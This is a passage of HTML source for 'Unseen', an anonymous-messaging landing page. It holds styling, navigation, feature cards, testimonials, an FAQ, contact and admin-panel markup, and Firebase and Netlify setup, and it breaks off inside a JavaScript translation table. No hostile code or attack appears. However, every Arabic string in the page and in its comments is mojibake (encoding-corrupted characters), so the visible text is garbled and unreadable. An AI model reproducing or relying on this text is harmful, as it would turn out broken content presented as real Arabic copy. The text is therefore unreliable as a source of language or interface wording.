<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Unseen â€” Ø§Ù„ØµÙØ­Ø© Ø§Ù„ØªØ¹Ø±ÙŠÙÙŠØ©</title>

  <!-- Fonts & Icons -->
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
  <link rel="icon" type="image/png" href="favicon.png">
  <!-- Netlify Identity Widget -->
  <script type="text/javascript" src="https://identity.netlify.com/v1/netlify-identity-widget.js"></script>

  <style>
    :root{
      --primary:#5a3fff;
      --accent:#06b6d4;
      --muted:#64748b;
      --bg:#ffffff;
      --card:rgba(10,11,13,0.04);
      --radius:14px;
    }
    [dir="ltr"]{ --flow:row; }
    [dir="rtl"]{ --flow:row-reverse; }

    *{box-sizing:border-box}
    html,body{height:100%;}
    body{
      margin:0;
      font-family:"Cairo", system-ui, -apple-system, "Inter", sans-serif;
      background:var(--bg);
      color:#081029;
      -webkit-font-smoothing:antialiased;
      -moz-osx-font-smoothing:grayscale;
      transition:background .25s,color .25s;
    }
    body.dark{ --bg:#07102a; background:#07102a; color:#e6eef8; }

    header{display:flex;align-items:center;justify-content:space-between;padding:16px 20px;gap:12px}
    .brand{display:flex;align-items:center;gap:12px}
    .logo{display:inline-flex;align-items:center;justify-content:center;width:70px !important;height:70px !important;border-radius:10px;overflow:hidden;background:none !important}
  .logo img {
    width: 100% !important;
    height: 100% !important;
    object-fit: cover !important;
    padding: 0 !important;
}
    .brand h1{margin:0;font-size:1.05rem}
    nav{display:flex;gap:12px;align-items:center}
    nav a{color:inherit;text-decoration:none;padding:8px 10px;border-radius:10px;font-weight:600}
    .controls{display:flex;gap:8px;align-items:center}
    .icon-btn{background:none;border:1px solid transparent;padding:8px;border-radius:10px;cursor:pointer}
    .icon-btn:hover{transform:translateY(-1px)}

    /* Mobile menu */
    .hamburger{display:none;background:none;border:none;font-size:22px}
    .mobile-nav{display:none;position:absolute;right:16px;left:16px;top:72px;background:var(--bg);border-radius:12px;padding:12px;box-shadow:0 6px 24px rgba(8,16,41,0.08);z-index:50}

    .hero{padding:48px 20px;text-align:center}
    .hero-inner{max-width:980px;margin:0 auto;display:grid;grid-template-columns:1fr;gap:18px;align-items:center}
    .eyebrow{display:inline-block;background:rgba(90,63,255,0.08);color:var(--primary);padding:6px 10px;border-radius:999px;font-weight:700}
    .hero h2{font-size:2.1rem;margin:6px 0}
    .hero p{color:var(--muted);margin:0 0 12px}
    .hero-actions{display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
    .btn{display:inline-flex;gap:10px;align-items:center;padding:12px 16px;border-radius:12px;border:none;cursor:pointer;font-weight:700}
    .btn-primary{background:linear-gradient(90deg,var(--primary),var(--accent));color:white}
    .btn-ghost{background:transparent;border:1px solid rgba(8,16,41,0.06);color:inherit}

    .profile-link{display:inline-flex;gap:8px;align-items:center;padding:8px 12px;border-radius:999px;background:var(--card);font-weight:600}

    /* Features grid */
    .features{padding:20px;max-width:1100px;margin:6px auto;display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px}
    .card{background:var(--card);padding:18px;border-radius:12px;box-shadow:0 6px 18px rgba(8,16,41,0.04);transition:transform .2s,box-shadow .2s}
    .card:hover{transform:translateY(-6px);box-shadow:0 24px 52px rgba(8,16,41,0.06)}
    .card .material-icons{font-size:28px;color:var(--accent);display:block;margin-bottom:10px}
    .card h3{margin:0 0 6px;font-size:1.05rem}
    .card p{margin:0;color:var(--muted);font-size:0.95rem}

    /* Stats */
    .stats{display:flex;gap:12px;justify-content:center;padding:18px;flex-wrap:wrap}
    .stat{background:linear-gradient(180deg,rgba(255,255,255,0.6),rgba(255,255,255,0.4));padding:12px 16px;border-radius:12px;text-align:center;min-width:120px}
    .stat strong{display:block;font-size:1.4rem}
    .muted{color:var(--muted)}

    /* Testimonials */
    .testimonials{padding:18px 20px;max-width:1000px;margin:0 auto}
    .test-container{position:relative;overflow:hidden;border-radius:12px}
    .test-list{display:flex;transition:transform .45s ease}
    .test{min-width:100%;Padding:22px;background:var(--card);display:flex;gap:14px;align-items:flex-start}
    .avatar{width:56px;height:56px;border-radius:50%;background:linear-gradient(90deg,var(--primary),var(--accent));color:white;display:grid;place-items:center;font-weight:700}

    /* FAQ */
    .faq{max-width:900px;margin:18px auto;padding:0 20px}
    .faq-item{background:var(--card);border-radius:10px;padding:12px;margin-bottom:8px}
    .faq-item summary{font-weight:700;cursor:pointer}
    summary::-webkit-details-marker{display:none}

    /* Contact modal */
    .modal{position:fixed;inset:0;display:none;place-items:center;background:rgba(2,6,23,0.5);z-index:60}
    .modal.open{display:grid}
    .modal-card{background:var(--bg);padding:18px;border-radius:12px;width:380px;max-width:94%}
    .form-group{display:flex;flex-direction:column;gap:6px;margin-bottom:10px}
    input,textarea{padding:10px;border-radius:8px;border:1px solid rgba(8,16,41,0.06);font-family:inherit}

    /* Auth Modal */
    .auth-modal-card{background:var(--bg);padding:22px;border-radius:12px;width:360px;max-width:94%;position:relative}
    .auth-options{display:flex;flex-direction:column;gap:12px;margin:16px 0}
    .auth-btn{display:flex;align-items:center;justify-content:center;gap:10px;padding:12px;border-radius:10px;border:1px solid rgba(8,16,41,0.08);background:var(--card);cursor:pointer;transition:all 0.2s}
    .auth-btn:hover{background:rgba(90,63,255,0.06);border-color:var(--primary)}
    .auth-btn.google{background:#fff;border:1px solid #dadce0}
    .auth-divider{display:flex;align-items:center;gap:10px;margin:16px 0;color:var(--muted)}
    .auth-divider::before,.auth-divider::after{content:'';flex:1;height:1px;background:rgba(8,16,41,0.1)}
    .auth-footer{text-align:center;margin-top:16px;color:var(--muted);font-size:0.9rem}

    .email-form{display:flex;flex-direction:column;gap:10px}
    .email-form .small-note{font-size:0.9rem;color:var(--muted);text-align:center}
    .auth-toggle{background:none;border:none;color:var(--primary);cursor:pointer;font-weight:700}

    footer{padding:20px;text-align:center;color:var(--muted)}
    .socials{display:flex;gap:10px;justify-content:center;margin-top:8px}
    .socials a{display:inline-flex;padding:8px;border-radius:10px}

    /* back to top */
    .back-to-top{position:fixed;left:18px;bottom:18px;border-radius:999px;padding:10px;display:none;z-index:80}
    .back-to-top.show{display:inline-flex}

    /* Admin Panel */
    .admin-panel{display:none;position:fixed;top:0;right:0;bottom:0;width:320px;background:var(--bg);z-index:100;box-shadow:-4px 0 20px rgba(0,0,0,0.1);padding:20px;overflow-y:auto}
    .admin-panel.open{display:block}
    .admin-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}
    .admin-section{margin-bottom:20px}
    .admin-list{list-style:none;padding:0;margin:0}
    .admin-list li{padding:10px;border-bottom:1px solid rgba(0,0,0,0.1);display:flex;justify-content:space-between;align-items:center}
    .admin-actions{display:flex;gap:8px}

    /* Toast notifications */
    .toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:var(--primary);color:white;padding:12px 20px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.15);z-index:1000;display:none;align-items:center;gap:10px}
    .toast.show{display:flex;animation:fadeInUp 0.3s ease}
    @keyframes fadeInUp{from{opacity:0;transform:translate(-50%,20px)} to{opacity:1;transform:translate(-50%,0)}}

    /* Loading spinner */
    .spinner{display:inline-block;width:20px;height:20px;border:2px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:white;animation:spin 1s ease-in-out infinite}
    @keyframes spin{to{transform:rotate(360deg)}}

    /* Netlify Identity customization */
    .netlify-identity-container {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 1000;
      background: rgba(0, 0, 0, 0.5);
    }
    
    .netlify-identity-modal {
      background: var(--bg);
      border-radius: 12px;
      padding: 20px;
      width: 90%;
      max-width: 400px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
    }
    
    .netlify-identity-close {
      position: absolute;
      top: 10px;
      right: 10px;
      background: none;
      border: none;
      font-size: 20px;
      cursor: pointer;
    }

    /* responsive */
    @media (max-width:900px){
      header{padding:12px}
      .hero h2{font-size:1.6rem}
      .hamburger{display:inline-block}
      nav{display:none}
      .mobile-nav{display:none}
      .admin-panel{width:100%}
    }
    #privacy-modal .modal-card {
  animation: slideInUp 0.4s ease-out;
}

@keyframes slideInUp {
  from {
    opacity: 0;
    transform: translateY(30px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}
    
#reject-terms {
  border: 1px solid rgba(239, 68, 68, 0.3);
  color: #ef4444;
}

#reject-terms:hover {
  background: rgba(239, 68, 68, 0.1);
}
  </style>
</head>
<body>
  <header>
    <div class="brand">
      <div class="logo" aria-hidden>
  <img src="https://i.postimg.cc/3wZP4sFW/20250912-1551-Unseen-Logo-Design-simple-compose-01k4yzn1nkf06sr1z9nxvtm7gc-1.png" alt="Unseen Logo" style="width:100%;height:100%;object-fit:contain;padding:6px">
</div>
      <div>
        <h1>Unseen</h1>
        <div class="muted" style="font-size:12px">Ø±Ø³Ø§Ø¦Ù„ Ù…Ø¬Ù‡ÙˆÙ„Ø© â€” Ø®ØµÙˆØµÙŠØ© Ø£ÙˆÙ„Ø§Ù‹</div>
      </div>
    </div>

    <nav aria-label="Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©">
      <a href="#features">Ø§Ù„Ù…Ø²Ø§ÙŠØ§</a>
      <a href="#testimonials">Ø¢Ø±Ø§Ø¡</a>
      <a href="#faq">Ø§Ù„Ø£Ø³Ø¦Ù„Ø©</a>
      <a href="#contact" id="contact-link">ØªÙˆØ§ØµÙ„</a>
    </nav>

    <div class="controls">
      <button class="icon-btn" id="lang-toggle" title="ØªØ¨Ø¯ÙŠÙ„ Ø§Ù„Ù„ØºØ©"><span class="material-icons">translate</span></button>
      <button class="icon-btn" id="theme-toggle" title="ØªØ¨Ø¯ÙŠÙ„ Ø§Ù„Ø«ÙŠÙ…"><span class="material-icons">dark_mode</span></button>
      <button class="icon-btn" id="profile-copy" title="Ø§Ù†Ø³Ø® Ø±Ø§Ø¨Ø· Ù…Ù„ÙÙƒ"><span class="material-icons">link</span></button>

      <!-- Netlify auth controls -->
      <button class="icon-btn" id="auth-btn" title="ØªØ³Ø¬ÙŠÙ„/Ø­Ø³Ø§Ø¨"><span class="material-icons">person</span></button>
<button class="icon-btn" id="signout-btn" title="ØªØ³Ø¬ÙŠÙ„ Ø®Ø±ÙˆØ¬" style="display:none">
    <span class="material-icons">exit_to_app</span>
</button>
      
      <!-- Admin panel toggle (visible only for admins) -->
      <button class="icon-btn" id="admin-btn" title="Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…" style="display:none"><span class="material-icons">admin_panel_settings</span></button>

      <button class="hamburger" id="hamburger" aria-label="Ù‚Ø§Ø¦Ù…Ø©"> <span class="material-icons">menu</span></button>
    </div>

    <div class="mobile-nav" id="mobile-nav" aria-hidden>
      <a href="#features">Ø§Ù„Ù…Ø²Ø§ÙŠØ§</a><br>
      <a href="#testimonials">Ø¢Ø±Ø§Ø¡ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†</a><br>
      <a href="#faq">Ø§Ù„Ø£Ø³Ø¦Ù„Ø©</a><br>
      <a href="#contact" id="contact-link-2">ØªÙˆØ§ØµÙ„</a>
    </div>
  </header>

  <main>
    <section class="hero" id="home">
      <div class="hero-inner">
        <div style="text-align:center">
          <span class="eyebrow">Ø¬Ø¯ÙŠØ¯</span>
          <h2 id="hero-title">Ù‚Ù„Ù‡Ø§. ÙˆØ£Ù†Øª ØºÙŠØ± Ù…Ø±Ø¦ÙŠ.</h2>
          <p id="hero-subtext">Ø§Ø­ØµÙ„ Ø¹Ù„Ù‰ Ø±Ø³Ø§Ø¦Ù„ Ù…Ø¬Ù‡ÙˆÙ„Ø© Ù…Ù† Ø£ØµØ¯Ù‚Ø§Ø¦Ùƒ â€” Ù…Ù…ØªØ¹Ø©ØŒ Ø­Ù‚ÙŠÙ‚ÙŠØ©ØŒ ÙˆØ®Ø§ØµØ© Ø¯Ø§Ø¦Ù…Ù‹Ø§.</p>

          <div class="hero-actions">
            <button class="btn btn-primary" id="cta-btn"><span class="material-icons">send</span><span id="cta-text">Ø§Ø¨Ø¯Ø£ Ø§Ù„Ø¢Ù†</span></button>
            <button class="btn btn-ghost" id="open-contact"><span class="material-icons">support_agent</span>ØªÙˆØ§ØµÙ„ Ù…Ø¹Ù†Ø§</button>
            <div class="profile-link" title="Ø±Ø§Ø¨Ø· Ù…Ù„ÙÙƒ" id="profile-link">
              <span id="profile-link-text">unseen.app/u/yourname</span>
              <button id="copy-btn" class="icon-btn" style="margin-inline-start:6px"><span class="material-icons">content_copy</span></button>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- STATS -->
    <section class="stats" aria-label="Ø¥Ø­ØµØ§Ø¡Ø§Øª">
      <div class="stat"><span class="muted">Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„ÙŠÙˆÙ…</span><strong id="stat-messages">1,248</strong></div>
      <div class="stat"><span class="muted">Ù…Ø³ØªØ®Ø¯Ù…ÙˆÙ†</span><strong id="stat-users">5,432</strong></div>
      <div class="stat"><span class="muted">Ù…ØªÙˆØ³Ø· ØªÙ‚ÙŠÙŠÙ…</span><strong id="stat-rating">4.8â˜…</strong></div>
    </section>

    <!-- FEATURES -->
    <section class="features" id="features" aria-labelledby="features-title">
      <h2 id="features-title" style="grid-column:1/-1;text-align:center">Ù…Ø²Ø§ÙŠØ§ Unseen</h2>

      <div class="card">
        <span class="material-icons">person_add</span>
        <h3>Ø£Ù†Ø´Ø¦ Ù…Ù„ÙÙƒ</h3>
        <p>Ø­Ø³Ø§Ø¨ Ø³Ø±ÙŠØ¹ ÙˆØ¨Ø³ÙŠØ· Ù…Ø¹ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø®ØµÙˆØµÙŠØ© Ù…ØªÙ‚Ø¯Ù…Ø©.</p>
      </div>

      <div class="card">
        <span class="material-icons">link</span>
        <h3>Ø´Ø§Ø±Ùƒ Ø§Ù„Ø±Ø§Ø¨Ø·</h3>
        <p>Ø§Ù†Ø³Ø® Ø±Ø§Ø¨Ø· Ù…Ù„ÙÙƒ Ø£Ùˆ Ø´Ø§Ø±ÙƒÙ‡ Ù…Ø¨Ø§Ø´Ø±Ø© Ø¹Ø¨Ø± Ø§Ù„ØªØ·Ø¨ÙŠÙ‚Ø§Øª.</p>
      </div>

      <div class="card">
        <span class="material-icons">mail</span>
        <h3>Ø§Ø³ØªÙ‚Ø¨Ù„ Ø±Ø³Ø§Ø¦Ù„ Ù…Ø¬Ù‡ÙˆÙ„Ø©</h3>
        <p>ÙˆØ§Ø¬Ù‡Ø© Ù‚Ø±Ø§Ø¡Ø© Ø¢Ù…Ù†Ø© ÙˆÙ…Ø±ÙŠØ­Ø©ØŒ Ù…Ø¹ ÙÙ„ØªØ±Ø© Ù„Ù„Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ù…Ø³ÙŠØ¦Ø©.</p>
      </div>

      <div class="card">
        <span class="material-icons">shield</span>
        <h3>Ø­Ù…Ø§ÙŠØ© ÙˆØ®ØµÙˆØµÙŠØ©</h3>
        <p>Ø³ÙŠØ§Ø³Ø© Ø®ØµÙˆØµÙŠØ© ÙˆØ§Ø¶Ø­Ø© ÙˆØ®ÙŠØ§Ø±Ø§Øª Ø­Ø¸Ø± ÙˆØ¥Ø®ÙØ§Ø¡ Ø§Ù„Ù…ØªØ§Ø¨Ø¹ÙŠÙ†.</p>
      </div>

      <div class="card">
        <span class="material-icons">bolt</span>
        <h3>ØªØ­Ù„ÙŠÙ„Ø§Øª Ø³Ø±ÙŠØ¹Ø©</h3>
        <p>Ù…Ù‚Ø§ÙŠÙŠØ³ Ø¨Ø³ÙŠØ·Ø© Ù„Ù‚ÙŠØ§Ø³ ØªÙØ§Ø¹Ù„ Ø§Ù„Ø£ØµØ¯Ù‚Ø§Ø¡ ÙˆØ§Ù„Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ø£ÙƒØ«Ø± Ø´ÙŠÙˆØ¹Ù‹Ø§.</p>
      </div>

      <div class="card">
        <span class="material-icons">autorenew</span>
        <h3>ØªØµÙÙŠØ© Ø°ÙƒÙŠØ©</h3>
        <p>Ø®ÙˆØ§Ø±Ø²Ù…ÙŠØ© ØªÙ…Ù†Ø¹ Ø§Ù„ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø³ÙŠØ¦Ø© ÙˆØªÙˆÙØ± ØªØ¬Ø±Ø¨Ø© Ø¢Ù…Ù†Ø©.</p>
      </div>

      <div class="card">
        <span class="material-icons">share</span>
        <h3>Ù†Ø´Ø± Ø¢Ù…Ù†</h3>
        <p>Ø®ÙŠØ§Ø±Ø§Øª Ù…Ø´Ø§Ø±ÙƒØ© Ù…Ø¶Ù…Ù‘Ù†Ø© ÙˆÙ†ØµØ§Ø¦Ø­ Ù„ÙƒØªØ§Ø¨Ø© Ø±ÙˆØ§Ø¨Ø· Ø°ÙƒÙŠØ©.</p>
      </div>

      <div class="card">
        <span class="material-icons">settings</span>
        <h3>ØªØ­ÙƒÙ… ÙƒØ§Ù…Ù„</h3>
        <p>Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ù…Ø±Ù†Ø©: Ù…Ù† ÙŠÙƒØªØ¨ Ù„ÙƒØŒ Ù…Ù† ÙŠØ±Ù‰ Ù…Ù„ÙÙƒØŒ ÙˆÙ…ØªÙ‰ ÙŠÙƒÙˆÙ† Ø±Ø§Ø¨Ø·Ùƒ Ù†Ø´Ø·Ù‹Ø§.</p>
      </div>
    </section>

    <!-- Testimonials -->
    <section class="testimonials" id="testimonials">
      <h2 style="text-align:center">Ø¢Ø±Ø§Ø¡ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†</h2>
      <div class="test-container" aria-live="polite">
        <div class="test-list" id="test-list">
          <div class="test">
            <div class="avatar">A</div>
            <div>
              <strong>Ø£Ø­Ù…Ø¯</strong>
              <p class="muted">"Ù…Ù†ØµØ© Ø¨Ø³ÙŠØ·Ø© ÙˆÙ…Ù…ØªØ¹Ø© â€” Ø£Ø­Ø¨Ø¨Øª Ø§Ù„Ø®ØµÙˆØµÙŠØ© ÙˆØ³Ù‡ÙˆÙ„Ø© Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ©."</p>
            </div>
          </div>

          <div class="test">
            <div class="avatar">L</div>
            <div>
              <strong>Ù„ÙŠÙ„Ù‰</strong>
              <p class="muted">"Ø§Ù„ÙÙ„ØªØ±Ø© Ù…Ù…ØªØ§Ø²Ø©ØŒ ÙˆØµÙ„ØªÙ†ÙŠ Ø±Ø³Ø§Ø¦Ù„ Ø¬ÙŠØ¯Ø© Ø¨Ø¯ÙˆÙ† Ø¥Ø³Ø§Ø¡Ø©."</p>
            </div>
          </div>

          <div class="test">
            <div class="avatar">M</div>
            <div>
              <strong>Ù…Ø­Ù…Ø¯</strong>
              <p class="muted">"Ø§Ù„ØªØµÙ…ÙŠÙ… Ø¹Ù…Ù„ÙŠ ÙˆØ³Ù‡Ù„ Ø§Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆØ¨Ø§ÙŠÙ„."</p>
            </div>
          </div>
        </div>
      </div>
    </section>

    <!-- FAQ -->
    <section class="faq" id="faq">
      <h2 style="text-align:center">Ø§Ù„Ø£Ø³Ø¦Ù„Ø© Ø§Ù„Ø´Ø§Ø¦Ø¹Ø©</h2>
      <div class="faq-item">
        <details>
          <summary>Ù‡Ù„ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ ÙØ¹Ù„Ø§Ù‹ Ù…Ø¬Ù‡ÙˆÙ„Ø©ØŸ</summary>
          <div class="muted">Ù†Ø¹Ù… â€” Ù†Ø­Ù† Ù„Ø§ Ù†Ø´Ø§Ø±Ùƒ Ø§Ù„Ù‡ÙˆÙŠØ© Ù…Ø¹ ØµØ§Ø­Ø¨ Ø§Ù„Ù…Ù„ÙØŒ ÙˆÙŠÙ…ÙƒÙ† Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø­Ø¸Ø± Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ù…Ø³ÙŠØ¦Ø©.</div>
        </details>
      </div>

      <div class="faq-item">
        <details>
          <summary>ÙƒÙŠÙ Ø£Ø­Ø°Ù Ù…Ù„ÙÙŠ Ù†Ù‡Ø§Ø¦ÙŠÙ‹Ø§ØŸ</summary>
          <div class="muted">Ù…Ù† Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ù…Ù„Ù Ø§Ø¶ØºØ· "Ø­Ø°Ù Ø§Ù„Ø­Ø³Ø§Ø¨"ØŒ Ø³ØªÙØ­Ø°Ù Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ø¹Ø¯ ØªØ£ÙƒÙŠØ¯Ùƒ.</div>
        </details>
      </div>

      <div class="faq-item">
        <details>
          <summary>Ù‡Ù„ ÙŠÙ…ÙƒÙ†Ù†ÙŠ Ø§Ø³ØªØ±Ø¬Ø§Ø¹ Ø±Ø³Ø§Ù„Ø© Ù…Ø­Ø°ÙˆÙØ©ØŸ</summary>
          <div class="muted">Ù„Ø§ â€” Ø¹Ù†Ø¯ Ø§Ù„Ø­Ø°Ù ÙŠØªÙ… Ø¥Ø²Ø§Ù„ØªÙ‡Ø§ Ù†Ù‡Ø§Ø¦ÙŠÙ‹Ø§ Ù„Ø£Ø³Ø¨Ø§Ø¨ ØªØªØ¹Ù„Ù‚ Ø¨Ø§Ù„Ø®ØµÙˆØµÙŠØ©.</div>
        </details>
      </div>
    </section>

    <!-- Contact Modal -->
    <div class="modal" id="contact-modal" aria-hidden="true">
      <div class="modal-card" role="dialog" aria-modal="true" aria-labelledby="contact-title">
        <h3 id="contact-title">ØªÙˆØ§ØµÙ„ Ù…Ø¹Ù†Ø§</h3>
        <form id="contact-form">
          <div class="form-group">
            <label for="name">Ø§Ù„Ø§Ø³Ù…</label>
            <input id="name" name="name" placeholder="Ø§Ø³Ù…Ùƒ" required>
          </div>
          <div class="form-group">
            <label for="email">Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ</label>
            <input id="email" name="email" type="email" placeholder="example@mail.com" required>
          </div>
          <div class="form-group">
            <label for="message">Ø§Ù„Ø±Ø³Ø§Ù„Ø©</label>
            <textarea id="message" name="message" rows="4" placeholder="Ù…Ù„Ø§Ø­Ø¸ØªÙƒ Ø£Ùˆ Ø³Ø¤Ø§Ù„Ùƒ" required></textarea>
          </div>
          <div style="display:flex;gap:8px;justify-content:flex-end">
            <button type="button" class="btn btn-ghost" id="close-modal">Ø¥Ù„ØºØ§Ø¡</button>
            <button type="submit" class="btn btn-primary">Ø£Ø±Ø³Ù„</button>
          </div>
        </form>
      </div>
    </div>

    <!-- Admin Panel -->
    <div class="admin-panel" id="admin-panel">
      <div class="admin-header">
        <h3>Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…</h3>
        <button class="icon-btn" id="close-admin-panel"><span class="material-icons">close</span></button>
      </div>
      
      <div class="admin-section">
        <h4>Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ù…Ø¨Ù„Øº Ø¹Ù†Ù‡Ø§</h4>
        <ul class="admin-list" id="reported-messages">
          <li>ÙŠØªÙ… Ø§Ù„ØªØ­Ù…ÙŠÙ„...</li>
        </ul>
      </div>
      
      <div class="admin-section">
        <h4>Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙˆÙ† Ø§Ù„Ù†Ø´Ø·ÙˆÙ†</h4>
        <ul class="admin-list" id="active-users">
          <li>ÙŠØªÙ… Ø§Ù„ØªØ­Ù…ÙŠÙ„...</li>
        </ul>
      </div>
      
      <div class="admin-section">
        <h4>Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª Ø§Ù„Ù†Ø¸Ø§Ù…</h4>
        <div class="muted" id="system-stats">ÙŠØªÙ… Ø§Ù„ØªØ­Ù…ÙŠÙ„...</div>
      </div>
    </div>

  </main>

  <footer>
    <div>Â© 2025 Unseen Â· Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ‚ Ù…Ø­ÙÙˆØ¸Ø©</div>
    <div class="socials" aria-label="Ø±ÙˆØ§Ø¨Ø· Ø§Ù„ØªÙˆØ§ØµÙ„">
      <a href="#" aria-label="Ø§Ù†Ø³ØªØ¬Ø±Ø§Ù…"><span class="material-icons">instagram</span></a>
      <a href="#" aria-label="ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù…"><span class="material-icons">send</span></a>
      <a href="#" aria-label="ØªÙˆÙŠØªØ±"><span class="material-icons">twitter</span></a>
    </div>
  </footer>

  <button class="back-to-top icon-btn" id="back-to-top" aria-label="Ø§Ø±Ø¬Ø¹ Ù„Ø£Ø¹Ù„Ù‰"><span class="material-icons">arrow_upward</span></button>

  <!-- Toast notification -->
  <div class="toast" id="toast">
    <span id="toast-message"></span>
  </div>

  <!-- Firebase (compat) SDKs - Ø¥Ø²Ø§Ù„Ø© Firebase Authentication -->
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-functions-compat.js"></script>

  <script>
    /**************************
     * Ø¥Ø¹Ø¯Ø§Ø¯ Firebase Ù‡Ù†Ø§ (Ø¨Ø¯ÙˆÙ† Authentication)
     **************************/
    const firebaseConfig = {
      apiKey: "AIzaSyB7uWrWJ1v_o3fqx0442wIkrAfTnPn84Mo",
      authDomain: "unseen-93dd8.firebaseapp.com",
      projectId: "unseen-93dd8",
      storageBucket: "unseen-93dd8.firebasestorage.app",
      messagingSenderId: "142670337449",
      appId: "1:142670337449:web:f41e9b5ebbb433378060b8",
      measurementId: "G-SPL7YN9LZ1"
    };

    // Initialize Firebase Ø¨Ø¯ÙˆÙ† Authentication
    const app = firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    const functions = firebase.functions();

    // DOM Elements
    const langToggle = document.getElementById('lang-toggle');
    const themeToggle = document.getElementById('theme-toggle');
    const bodyEl = document.body;
    const ctaBtn = document.getElementById('cta-btn');
    const openContact = document.getElementById('open-contact');
    const contactModal = document.getElementById('contact-modal');
    const closeModal = document.getElementById('close-modal');
    const contactForm = document.getElementById('contact-form');
    const copyBtn = document.getElementById('copy-btn');
    const profileLinkText = document.getElementById('profile-link-text');
    const authBtn = document.getElementById('auth-btn');
    const signoutBtn = document.getElementById('signout-btn');
    const adminBtn = document.getElementById('admin-btn');
    const adminPanel = document.getElementById('admin-panel');
    const closeAdminPanel = document.getElementById('close-admin-panel');
    const hamburger = document.getElementById('hamburger');
    const mobileNav = document.getElementById('mobile-nav');
    const toast = document.getElementById('toast');
    const toastMessage = document.getElementById('toast-message');
    
    // Texts (Arabic default + English)
    const texts = {
      ar:{
        heroTitle: 'Ù‚Ù„Ù‡Ø§. ÙˆØ£Ù†Øª ØºÙŠØ± Ù…Ø±Ø¦ÙŠ.',
        heroSub: 'Ø§Ø­ØµÙ„ Ø¹Ù„Ù‰ Ø±Ø³Ø§Ø¦Ù„ Ù…Ø¬Ù‡ÙˆÙ„Ø© Ù…Ù† Ø£ØµØ¯Ù‚Ø§Ø¦Ùƒ â€” Ù…Ù…ØªØ¹Ø©ØŒ Ø­Ù‚ÙŠÙ‚ÙŠØ©ØŒ ÙˆØ®Ø§ØµØ© Ø¯Ø§Ø¦Ù…Ù‹Ø§.',
        cta: 'Ø§Ø¨Ø¯Ø£ Ø§Ù„Ø¢Ù†',
        ctaLoggedIn: 'Ù…Ù„ÙÙŠ Ø§Ù„Ø´Ø®ØµÙŠ',
        contact:'ØªÙˆØ§ØµÙ„ Ù…Ø¹Ù†Ø§',
        profileDefault:'unseen.app/u/yourname',
        copied: 'ØªÙ… Ù†Ø³Ø® Ø§Ù„Ø±Ø§Ø¨Ø·',
        copyFailed: 'Ù„Ù… ÙŠØªÙ… Ø§Ù„Ù†Ø³Ø®',
        messageSent: 'ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø© â€” Ø´ÙƒØ±Ù‹Ø§ Ù„Ùƒ!',
        sendError: 'Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„: ',
        fillRequired: 'Ø§Ù…Ù„Ø£ Ø§Ù„Ø­Ù‚ÙˆÙ„ Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©',
        setupProfile: 'ÙŠÙ…ÙƒÙ†Ùƒ Ø§Ù„Ø¢Ù† Ø¥Ø¹Ø¯Ø§Ø¯ Ù…Ù„ÙÙƒ ÙˆÙ…Ø´Ø§Ø±ÙƒØ© Ø§Ù„Ø±Ø§Ø¨Ø·',
        adminPanel: 'Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…',
        loading: 'Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...',
        login: 'ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„',
